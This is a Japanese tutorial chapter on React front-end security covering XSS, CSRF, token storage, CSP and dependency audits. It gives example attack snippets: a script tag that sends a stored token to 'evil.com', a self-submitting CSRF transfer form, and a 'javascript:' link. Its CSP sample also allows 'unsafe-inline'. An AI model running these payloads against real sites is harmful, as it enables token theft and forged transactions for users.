# 14-4. セキュリティ基礎（XSS/CSRF/トークン）

## 🎯 この章で学ぶこと

- XSS、CSRF、トークン保管の基礎
- React の自動防御と注意点
- やっていいこと・いけないこと

---

## 📖 主な脅威

| 名前 | 一言で |
| --- | --- |
| **XSS** | 不正なJSが画面に注入される |
| **CSRF** | 別サイトから勝手にリクエストされる |
| **トークン漏洩** | 認証情報が盗まれる |
| **SQLインジェクション** | サーバー側、UIには直接関係薄 |
| **クリックジャッキング** | 別サイトのフレーム内に置かれる |

---

## 💻 XSS（クロスサイトスクリプティング）

### 攻撃の例

```html
<!-- 攻撃者が投稿 -->
<script>fetch('https://evil.com/steal?token=' + localStorage.token)</script>
```

→ 別ユーザーがそれを表示すると、JSが実行されてトークンが盗まれる。

### React の自動エスケープ

```jsx
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;
// → 「&lt;script&gt;...」と文字列として表示、実行されない
```

JSXの `{...}` は**自動でエスケープ**してくれる。**通常はXSS安全**。

### 危険：dangerouslySetInnerHTML

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

→ **エスケープなし**でHTMLを描画。XSSのリスク。

#### 安全に使うには：

```bash
npm install dompurify
```

```jsx
import DOMPurify from 'dompurify';

const safe = DOMPurify.sanitize(userInput);
<div dangerouslySetInnerHTML={{ __html: safe }} />
```

→ DOMPurify で危険なタグ・属性を除去。

### URL の脆弱性

```jsx
<a href={userInput}>リンク</a>
```

→ `userInput` が `javascript:alert(1)` だとXSS。

```jsx
function safeUrl(url) {
  try {
    const u = new URL(url);
    if (u.protocol === 'http:' || u.protocol === 'https:') return url;
    return '#';
  } catch {
    return '#';
  }
}
```

## 💻 CSRF（クロスサイトリクエストフォージェリ）

### 攻撃の例

ログイン中のユーザーが攻撃者のサイトを開く：

```html
<!-- 攻撃者のサイト -->
<form action="https://target.com/api/transfer" method="POST">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

→ ユーザーのcookieが自動送信されて、銀行送金などが実行される。

### 対策

#### ① SameSite cookie

```text
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
```

→ 別サイトからは cookie が送信されない。

#### ② CSRFトークン

サーバが画面ごとにトークンを発行 → クライアントが送信時に添付 → サーバで検証。

```jsx
<form method="POST">
  <input type="hidden" name="_csrf" value={csrfToken} />
</form>
```

#### ③ Origin / Referer ヘッダ確認（サーバ）

別オリジンからのリクエストを拒否。

## 💻 トークンの保管

| 場所 | XSS耐性 | CSRF耐性 |
| --- | --- | --- |
| `localStorage` | ❌ JSから読める | ◎ |
| `sessionStorage` | ❌ JSから読める | ◎ |
| **httpOnly Cookie** | ◎ JSから読めない | △ CSRFトークン必須 |
| **memory（state）** | ◎ | ◎ ただし永続化なし |

→ **アクセストークンはmemory + 短命、リフレッシュトークンはhttpOnly cookie**が現代のベスト。

詳しくは [[8-10-セッション管理]]。

## 💻 環境変数の取り扱い

```text
# .env
VITE_API_URL=https://api.example.com
VITE_API_KEY=secret123  ← ❌ これはバンドルに混入
```

`VITE_*` の環境変数はクライアントJSに含まれます。**シークレットを置いてはいけない**。

→ サーバーサイド経由でアクセス。

---

## 💻 CSP（Content Security Policy）

ブラウザに「許可するスクリプトの出元」を伝える：

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' https:;">
```

→ 不正なJSが実行されにくくなる。

---

## 💻 Permissions Policy / Feature Policy

```text
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

→ 不要な権限を制限。

---

## 💻 HTTPS

すべての通信を **HTTPS** で。HTTPだと中間者攻撃で改ざん・盗聴される。

→ Vercel や Netlify は自動で HTTPS。

---

## 💻 依存ライブラリの脆弱性

```bash
npm audit          # 脆弱性をチェック
npm audit fix      # 自動修正
```

定期的に実行。GitHub の Dependabot も有効に。

## ❌ よくある間違い

### dangerouslySetInnerHTML をsanitizerなしで

→ DOMPurify必須。

### localStorage に JWT

→ XSS 1発でアウト。httpOnly cookie に。

### secretをVITE_*に

→ クライアントに漏れる。サーバー側に。

### URLパラメータで認証情報

```text
/login?token=abc123
```

→ ログ・履歴に残る。POSTのbodyに。

### `eval` / `Function` を使う

→ XSSのリスク。基本使わない。

---

## ✅ ベストプラクティス

1. **JSXで `{...}` を使う**（自動エスケープ）
2. **dangerouslySetInnerHTML はDOMPurify必須**
3. **アクセストークンは memory、リフレッシュは httpOnly cookie**
4. **シークレットをクライアントに置かない**
5. **HTTPS + CSP + npm audit**

---

## 🔬 実践演習

ブログ投稿アプリで：

- ユーザーの投稿を表示（自動エスケープ確認）
- マークダウンを描画したい → DOMPurifyでサニタイズ
- リンクは https/http のみ許可

## 📝 まとめ

- React は自動エスケープで XSS 対策済み
- dangerouslySetInnerHTML は DOMPurify
- CSRF は SameSite cookie + tokenで対策
- トークンは httpOnly cookie + memory
- HTTPS + CSP + 依存監査
